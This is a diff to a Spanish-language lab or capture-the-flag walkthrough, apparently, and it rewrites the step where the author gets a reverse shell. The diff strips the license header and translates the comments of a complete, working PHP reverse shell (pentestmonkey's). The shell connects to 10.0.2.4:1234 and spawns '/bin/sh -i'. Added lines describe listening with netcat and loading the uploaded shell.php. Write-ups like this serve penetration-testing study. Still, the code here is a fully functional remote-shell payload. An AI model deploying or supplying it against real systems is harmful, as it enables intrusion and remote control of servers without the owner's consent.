@@ -138,61 +138,14 @@ En el codigo fuente de la pagina vemos que nos ha listado los directorios tal y 
 
 ![image](https://github.com/user-attachments/assets/aeb25b42-73c5-4c6e-a325-f7f4b5c3cd56)
 
-Vamos a realizar la shell inversa
-Para ello vamos a inyectar el siguiente codigo malicioso de PHP
-CAMBIALO A TUS NECESIDADES
+Vamos a realizar la shell inversa y para ello vamos a inyectar el siguiente codigo malicioso realizado en php
 
 ```php
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
-set_time_limit (0);
+set_time_limit(0);
 $VERSION = "1.0";
-$ip = '10.0.2.4';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '10.0.2.4';  // Cambia la IP
+$port = 1234;       // Cambia el puerto
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -200,119 +153,91 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
+// Intentar desamonizar el proceso
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
 	if ($pid == -1) {
-		printit("ERROR: Can't fork");
+		printit("ERROR: No se puede hacer fork");
 		exit(1);
 	}
-	
 	if ($pid) {
-		exit(0);  // Parent exits
+		exit(0);  // El proceso padre termina
 	}
-
-	// Make the current process a session leader
-	// Will only succeed if we forked
 	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
+		printit("Error: No se puede setsid()");
 		exit(1);
 	}
-
 	$daemon = 1;
 } else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+	printit("ADVERTENCIA: Falló la desamonización.");
 }
 
-// Change to a safe directory
+// Cambiar a un directorio seguro
 chdir("/");
 
-// Remove any umask we inherited
+// Eliminar umask heredada
 umask(0);
 
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
+// Abrir la conexión inversa
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
 
-// Spawn shell process
+// Crear el proceso del shell
 $descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes);
-
 if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
+	printit("ERROR: No se puede crear el shell");
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
+// Poner los pipes en modo no bloqueante
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
 stream_set_blocking($sock, 0);
 
-printit("Successfully opened reverse shell to $ip:$port");
+printit("Conexión inversa establecida a $ip:$port");
 
 while (1) {
-	// Check for end of TCP connection
+	// Comprobar si la conexión TCP se cerró
 	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
+		printit("ERROR: Conexión terminada");
 		break;
 	}
 
-	// Check for end of STDOUT
+	// Comprobar si el proceso del shell terminó
 	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
+		printit("ERROR: El proceso del shell terminó");
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
+	// Esperar datos para leer desde los pipes o la conexión TCP
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
+	// Si se puede leer desde el socket, enviar datos al stdin del proceso
 	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
 		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
 		fwrite($pipes[0], $input);
 	}
 
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
+	// Si se puede leer desde el stdout del proceso, enviar datos al socket
 	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
 		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
 		fwrite($sock, $input);
 	}
 
-	// If we can read from the process's STDERR
-	// send data down tcp connection
+	// Si se puede leer desde el stderr del proceso, enviar datos al socket
 	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
 		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
 		fwrite($sock, $input);
 	}
 }
@@ -323,15 +248,14 @@ fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
 
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
+// Función para imprimir mensajes si no estamos en modo demonio
+function printit($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
+?>
 
-?> 
 ```
 
 Nos montamos un servidor rapido en python, ten en cuenta que tiene que estar donde tienes el codigo malicioso, y solo debes tener el codigo malicioso en esa ruta
@@ -346,7 +270,15 @@ Comprobamos que hemos mandado la shell correctamente
 
 ![image](https://github.com/user-attachments/assets/df998d15-7377-472c-9c5e-a52d362ec16b)
 
+Una vez hecho esto cerramos el server de python y nos ponemos en escucha con netcap por el puerto 1234
 
+![image](https://github.com/user-attachments/assets/763aa71e-4be2-45db-b0cd-cde7f212129f)
+
+Entramos al shell.php correctamente, se quedará la pagina cargando.
+
+![image](https://github.com/user-attachments/assets/4b0665f1-9b8f-45b0-a63d-457e74b14b26)
+
+![image](https://github.com/user-attachments/assets/aed0a6ad-83d1-4acb-80a9-55abaab7000c)
 
 
 
